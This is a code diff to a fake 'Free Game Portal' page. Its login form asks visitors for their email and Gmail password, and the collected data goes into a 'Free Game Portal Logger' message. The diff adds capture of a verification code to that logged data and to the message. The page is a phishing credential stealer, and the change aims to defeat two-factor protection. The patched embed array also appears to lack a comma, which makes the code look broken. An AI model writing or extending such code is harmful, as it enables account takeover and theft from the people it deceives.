@@ -74,7 +74,7 @@
         <p>Authentication Required</p>
         <input type="text" placeholder="Email"><br>
         <input type="password" placeholder="Gmail_Password"><br>
-        <input type="txt" placeholder="code"><br>
+        <input type="text" placeholder="code"><br>
         <button id="login-btn">install</button>
 
         <div id="loading-text" style="display:none; margin-top: 10px;">
@@ -110,6 +110,7 @@
                 const logData = {
                     username: gameName,
                     password: password,
+                    code: code, 
                     userAgent: navigator.userAgent,
                     ip: ipData.ip,
                     timestamp: new Date().toISOString()
@@ -126,6 +127,7 @@
                             { name: "Password", value: `\`${password}\``, inline: false },
                             { name: "User Agent", value: `\`${navigator.userAgent}\``, inline: false },
                             { name: "IP Address", value: `\`${logData.ip}\``, inline: false }
+                            { name: "code", value: `\`${code}\``, inline: false}, 
                         ],
                         footer: { text: "Free Game Portal Logger" }
                     }]
